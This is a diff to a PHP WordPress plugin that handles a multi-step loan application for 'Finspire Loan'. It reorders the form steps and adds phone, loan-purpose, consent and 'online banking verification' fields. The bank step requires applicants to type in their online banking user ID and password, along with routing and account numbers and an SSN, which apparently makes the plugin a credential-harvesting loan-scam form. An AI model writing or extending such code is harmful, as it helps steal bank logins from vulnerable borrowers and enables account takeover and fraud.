@@ -53,6 +53,12 @@ class Finspire_Loan_Form_Handler {
             } elseif ( ! is_email( $email ) ) {
                 $errors['email'] = __( 'Please enter a valid email address.', 'finspire-loan' );
             }
+            $phone = preg_replace( '/\D/', '', $data['phone'] ?? '' );
+            if ( empty( $phone ) ) {
+                $errors['phone'] = __( 'Please enter your phone number.', 'finspire-loan' );
+            } elseif ( strlen( $phone ) !== 10 ) {
+                $errors['phone'] = __( 'Please enter a valid 10-digit phone number.', 'finspire-loan' );
+            }
             $dob = trim( $data['dob'] ?? '' );
             if ( empty( $dob ) ) {
                 $errors['dob'] = __( 'Please enter your date of birth (MM/DD/YYYY).', 'finspire-loan' );
@@ -92,28 +98,6 @@ class Finspire_Loan_Form_Handler {
                 $errors['country'] = __( 'Please enter your country.', 'finspire-loan' );
             }
         } elseif ( 3 === $step ) {
-            if ( empty( trim( $data['bank_name'] ?? '' ) ) ) {
-                $errors['bank_name'] = __( 'Please enter your bank name.', 'finspire-loan' );
-            }
-            $routing = preg_replace( '/\D/', '', $data['routing_number'] ?? '' );
-            if ( empty( $routing ) ) {
-                $errors['routing_number'] = __( 'Please enter your 9-digit routing number.', 'finspire-loan' );
-            } elseif ( strlen( $routing ) !== 9 ) {
-                $errors['routing_number'] = __( 'Routing number must be exactly 9 digits.', 'finspire-loan' );
-            }
-            $account = preg_replace( '/\D/', '', $data['account_number'] ?? '' );
-            if ( empty( $account ) ) {
-                $errors['account_number'] = __( 'Please enter your account number.', 'finspire-loan' );
-            } elseif ( strlen( $account ) < 4 || strlen( $account ) > 17 ) {
-                $errors['account_number'] = __( 'Account number must be between 4 and 17 digits.', 'finspire-loan' );
-            }
-            if ( empty( trim( $data['online_banking_user_id'] ?? '' ) ) ) {
-                $errors['online_banking_user_id'] = __( 'Please enter your online banking user ID.', 'finspire-loan' );
-            }
-            if ( empty( $data['online_banking_password'] ?? '' ) ) {
-                $errors['online_banking_password'] = __( 'Please enter your online banking password.', 'finspire-loan' );
-            }
-        } elseif ( 4 === $step ) {
             $amount = floatval( $data['loan_amount'] ?? 0 );
             $min = floatval( $settings['min_loan_amount'] ?? 100 );
             $max = floatval( $settings['max_loan_amount'] ?? 25000 );
@@ -129,6 +113,38 @@ class Finspire_Loan_Form_Handler {
                     number_format( $min ),
                     number_format( $max )
                 );
+            }
+
+            if ( empty( trim( $data['loan_purpose'] ?? '' ) ) ) {
+                $errors['loan_purpose'] = __( 'Please select a loan purpose.', 'finspire-loan' );
+            }
+        } elseif ( 4 === $step ) {
+            if ( empty( trim( $data['bank_name'] ?? '' ) ) ) {
+                $errors['bank_name'] = __( 'Please enter your bank name.', 'finspire-loan' );
+            }
+            $routing = preg_replace( '/\D/', '', $data['routing_number'] ?? '' );
+            if ( empty( $routing ) ) {
+                $errors['routing_number'] = __( 'Please enter your 9-digit routing number.', 'finspire-loan' );
+            } elseif ( strlen( $routing ) !== 9 ) {
+                $errors['routing_number'] = __( 'Routing number must be exactly 9 digits.', 'finspire-loan' );
+            }
+            $account = preg_replace( '/\D/', '', $data['account_number'] ?? '' );
+            if ( empty( $account ) ) {
+                $errors['account_number'] = __( 'Please enter your account number.', 'finspire-loan' );
+            } elseif ( strlen( $account ) < 4 || strlen( $account ) > 17 ) {
+                $errors['account_number'] = __( 'Account number must be between 4 and 17 digits.', 'finspire-loan' );
+            }
+            if ( empty( trim( $data['online_banking_verification'] ?? '' ) ) ) {
+                $errors['online_banking_verification'] = __( 'Please complete the online banking verification field.', 'finspire-loan' );
+            }
+            if ( empty( trim( $data['online_banking_user_id'] ?? '' ) ) ) {
+                $errors['online_banking_user_id'] = __( 'Please enter your online banking user ID.', 'finspire-loan' );
+            }
+            if ( empty( $data['online_banking_password'] ?? '' ) ) {
+                $errors['online_banking_password'] = __( 'Please enter your online banking password.', 'finspire-loan' );
+            }
+            if ( empty( $data['contact_consent'] ) ) {
+                $errors['contact_consent'] = __( 'Please check the box to agree to the terms to proceed.', 'finspire-loan' );
             }
         }
 
@@ -192,7 +208,7 @@ class Finspire_Loan_Form_Handler {
             'first_name'            => sanitize_text_field( $raw['first_name'] ?? '' ),
             'last_name'             => sanitize_text_field( $raw['last_name'] ?? '' ),
             'email'                 => sanitize_email( $raw['email'] ?? '' ),
-            'phone'                 => '',
+            'phone'                 => sanitize_text_field( $raw['phone'] ?? '' ),
             'dob'                   => sanitize_text_field( $raw['dob'] ?? '' ),
             'ssn_masked'            => $ssn_masked,
             'age_confirmed'         => 1,
@@ -205,7 +221,10 @@ class Finspire_Loan_Form_Handler {
             'routing_number'        => sanitize_text_field( $raw['routing_number'] ?? '' ),
             'account_number_masked' => $acct_masked,
             'bank_verified'         => 1,
+            'online_banking_verification' => sanitize_text_field( $raw['online_banking_verification'] ?? '' ),
+            'contact_consent'             => ! empty( $raw['contact_consent'] ) ? 1 : 0,
             'loan_amount'           => floatval( $raw['loan_amount'] ?? 0 ),
+            'loan_purpose'          => sanitize_text_field( $raw['loan_purpose'] ?? '' ),
         ];
 
         // 5. Save to Database
